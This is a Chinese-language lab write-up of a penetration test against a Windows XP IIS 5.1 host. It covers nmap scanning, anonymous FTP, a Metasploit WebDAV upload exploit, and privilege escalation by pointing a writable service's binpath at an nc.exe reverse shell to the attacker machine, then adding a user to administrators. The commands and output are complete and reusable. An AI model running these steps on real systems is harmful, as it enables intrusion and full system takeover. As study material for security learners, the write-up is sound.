## 前言
看到许多读者对渗透测试学习笔记系列文章表现出浓厚兴趣，笔者决定继续撰写相关内容。本文将详细记录一次针对特定目标的渗透测试过程，希望为读者提供有价值的参考。

## 案例分析

### 实验环境
- **目标靶机**：10.11.1.13/24
- **攻击机**：Kali Linux (IP: 10.11.0.90)

### 渗透过程

#### 端口扫描
我们使用`nmap`工具对目标靶机进行端口扫描。
```bash
# nmap -sS -sV -p 1-1024 -Pn 10.11.1.13
Starting Nmap 7.50 (https://nmap.org) at 2017-08-10 23:19 CST
Nmap scan report for 10.11.1.13
Host is up (0.33s latency).
Not shown: 1022 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 5.1
MAC Address: 00:50:56:89:42:08 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
从扫描结果可以看出，目标靶机上运行了FTP服务和IIS 5.1服务。

#### FTP匿名登录检查
接下来，我们检查FTP服务是否存在匿名登录漏洞。
```bash
# ftp 10.11.1.13
Connected to 10.11.1.13.
220 Microsoft FTP Service
Name (10.11.1.13:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 Anonymous user logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls.
01-17-07  07:42PM                 AdminScripts
01-17-07  07:43PM                 ftproot
01-17-07  07:43PM                 iissamples
01-17-07  07:43PM                 Scripts
08-22-17  09:27PM                 wwwroot
226 Transfer complete.
ftp>
```
通过以上步骤，我们确认了FTP服务允许匿名登录，并且存在`wwwroot`目录。

#### 利用IIS WebDAV漏洞
根据扫描结果，目标机器运行的是IIS 5.1版本。我们在Exploit-DB中找到了一个相关的漏洞利用方法（[IIS WebDAV Write Access Code Execution](https://www.exploit-db.com/exploits/16471/)），并使用Metasploit框架中的模块来尝试获取Meterpreter会话。
```bash
msf > use exploit/windows/iis/iis_webdav_upload_asp
msf exploit(iis_webdav_upload_asp) > set RHOST 10.11.1.13
RHOST => 10.11.1.13
msf exploit(iis_webdav_upload_asp) > set PATH /hahaha.asp
PATH => /hahaha.asp
msf exploit(iis_webdav_upload_asp) > run
[*] Started reverse TCP handler on 10.11.0.90:4444 
[*] Checking /hahaha.asp
[*] Uploading 609362 bytes to /hahaha.txt...
[*] Moving /hahaha.txt to /hahaha.asp...
[*] Executing /hahaha.asp...
[-] Execution failed on /hahaha.asp [No Response]
[*] Exploit completed, but no session was created.

msf exploit(iis_webdav_upload_asp) > exploit
[*] Started reverse TCP handler on 10.11.0.90:4444 
[*] Checking /hahaha.asp
[*] Sending stage (957487 bytes) to 10.11.1.13
[*] Meterpreter session 3 opened (10.11.0.90:4444 -> 10.11.1.13:3287) at 2017-08-12 05:57:47 +0800
[-] Connection timed out while trying to checking /hahaha.asp
meterpreter >
```
成功获取到Meterpreter会话后，我们进一步检查当前用户的权限。
```bash
meterpreter > getuid
Server username: BOB\IWAM_BOB
meterpreter > sysinfo
Computer        : BOB
OS              : Windows XP (Build 2600, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
```

#### 提权
尽管我们的Meterpreter会话不是SYSTEM权限，但我们获得了以下信息：
- 目标操作系统：Windows XP SP1
- 当前登录账户：IWAM_BOB

为了提权，我们可以考虑以下几种方法：
1. 利用系统自带的服务或系统本身的提权漏洞（如MS16-016）。
2. 利用第三方软件的安全漏洞进行提权（如MYSQL CVE-2016-6662/6663）。
3. 利用不正确的文件和服务权限设置。

在本案例中，我们将演示第三种提权方法。为此，我们需要使用两个工具：
- `icacls` 或 `cacls`：用于检查文件夹或文件的权限配置信息。
- `accesschk`：来自Sysinternals工具集，用于检查用户或组对文件、目录、注册表等的权限信息。

首先，进入Meterpreter shell并查看IIS的web目录路径。
```bash
meterpreter > shell
Process 2544 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>cd c:\inetpub
cd c:\inetpub
C:\Inetpub>dir
 Volume in drive C has no label.
 Volume Serial Number is 50C3-3741
 Directory of C:\Inetpub
08/22/2017  06:30 PM              .
08/22/2017  06:30 PM              ..
01/17/2007  07:42 PM              AdminScripts
01/17/2007  07:43 PM              ftproot
01/17/2007  07:43 PM              iissamples
08/22/2017  01:50 AM              Scripts
08/22/2017  06:27 PM              wwwroot
             11 File(s)      3,183,328 bytes
              7 Dir(s)   1,645,780,992 bytes free
```

接着，上传`accesschk`和`nc`工具。
```bash
meterpreter > upload accesschk_xp.exe c:\\inetpub\\accesschk_xp.exe
[*] uploading  : accesschk_xp.exe -> c:\inetpub\accesschk_xp.exe
[*] uploaded   : accesschk_xp.exe -> c:\inetpub\accesschk_xp.exe
meterpreter > upload nc.exe c:\\inetpub\\nc.exe
[*] uploading  : nc.exe -> c:\inetpub\nc.exe
[*] uploaded   : nc.exe -> c:\inetpub\nc.exe
```

使用`accesschk`工具检查当前用户`IWAM_BOB`具有写权限的Windows服务。
```bash
C:\Inetpub>accesschk_xp.exe /accepteula -uwcqv IWAM_BOB * > ack.txt
C:\Inetpub>type ack.txt
RW SSDPSRV
    SERVICE_ALL_ACCESS
RW upnphost
    SERVICE_ALL_ACCESS
```

发现`SSDPSRV`和`upnphost`服务可以被当前用户修改。选择`SSDPSRV`服务进行进一步检查。
```bash
C:\Inetpub>accesschk_xp.exe /accepteula -ucqv SSDPSRV
SSDPSRV
  RW NT AUTHORITY\SYSTEM
    SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
    SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
    SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
    SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
    SERVICE_ALL_ACCESS
```

通过修改`SSDPSRV`服务的二进制路径，使其以SYSTEM权限执行反弹shell命令。
```bash
C:\Inetpub>sc qc SSDPSRV
[SC] GetServiceConfig SUCCESS
SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 4   DISABLED
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : SSDP Discovery Service  
        DEPENDENCIES       :   
        SERVICE_START_NAME : NT AUTHORITY\LocalService  

C:\Inetpub>sc config SSDPSRV binpath= "c:\inetpub\nc.exe -nv 10.11.0.90 9090 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS
C:\Inetpub>sc config SSDPSRV obj= ".\LocalSystem" password= ""
[SC] ChangeServiceConfig SUCCESS
C:\Inetpub>sc config SSDPSRV start= "demand"
[SC] ChangeServiceConfig SUCCESS
C:\Inetpub>sc qc SSDPSRV
[SC] GetServiceConfig SUCCESS
SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : c:\inetpub\nc.exe -nv 10.11.0.90 9090 -e cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : SSDP Discovery Service  
        DEPENDENCIES       :   
        SERVICE_START_NAME : LocalSystem
```

在攻击机上开启监听端口。
```bash
root@kali:~# nc -lvvp 9090
listening on [any] 9090 ...
```

在目标靶机上启动`SSDPSRV`服务。
```bash
C:\Inetpub>net start SSDPSRV
The service is not responding to the control function.
```

最终，我们成功反弹了一个SYSTEM权限的shell。
```bash
root@kali:~# nc -lvvp 9090
listening on [any] 9090 ...
Warning: forward host lookup failed for bogon: Unknown host
connect to [10.11.0.90] from bogon [10.11.1.13] 3015
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
Members
-------------------------------------------------------------------------------    
Administrator
The command completed successfully.
C:\WINDOWS\system32>net localgroup administrators IWAM_BOB /add
The command completed successfully.
C:\WINDOWS\system32>ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
        Connection-specific DNS Suffix  . : 
        IP Address. . . . . . . . . . . . : 10.11.1.13
        Subnet Mask . . . . . . . . . . . : 255.255.0.0
        Default Gateway . . . . . . . . . : 10.11.1.220
C:\WINDOWS\system32>cd c:\
C:\>dir /b /s proof.txt
C:\Documents and Settings\Administrator\Desktop\proof.txt
```

## 小结
本次渗透测试的主要步骤如下：
1. 使用`nmap`进行端口扫描。
2. 分析漏洞服务并利用。
3. 获取Meterpreter shell并检查不安全的Windows服务。
4. 配置Windows服务以SYSTEM权限执行反弹shell。
5. 开启Windows服务获取SYSTEM权限的shell。

## 参考
- [FuzzySecurity教程](http://fuzzysecurity.com/tutorials/16.html)